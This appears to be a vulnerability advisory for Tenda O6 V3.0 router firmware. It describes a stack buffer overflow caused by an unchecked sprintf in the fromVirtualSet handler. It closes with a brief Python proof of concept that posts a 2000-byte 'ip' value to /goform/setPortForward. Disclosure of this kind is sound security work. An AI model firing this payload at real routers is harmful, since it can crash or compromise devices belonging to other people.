## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3861.html

## Affected version

O6 V3.0 V1.0.0.7(2054)

## Vulnerability details

In the O6 V3.0 V1.0.0.7(2054) firmware has a stack overflow vulnerability in the `fromVirtualSet` function. The `v2, v3, v4, v6` variable receives the `ip, localPort, publicPort, app` parameters from a POST request. However, since the user can control the input of these parameters, the statement `sprintf((char *)v26, "0;%s;%s;%s;%s;%s;%s", v4, v3, v2, (const char *)v27, "1", v6);` can cause a buffer overflow. The user-provided  `ip, localPort, publicPort, app` can exceed the capacity of the `v26` array, triggering this security vulnerability.

![image-20240801132435207](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801132435207.png)

![image-20240801132425406](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801132425406.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/setPortForward"
payload = b"a"*2000

data = {"ip": payload}
response = requests.post(url, data=data)
print(response.text)
```

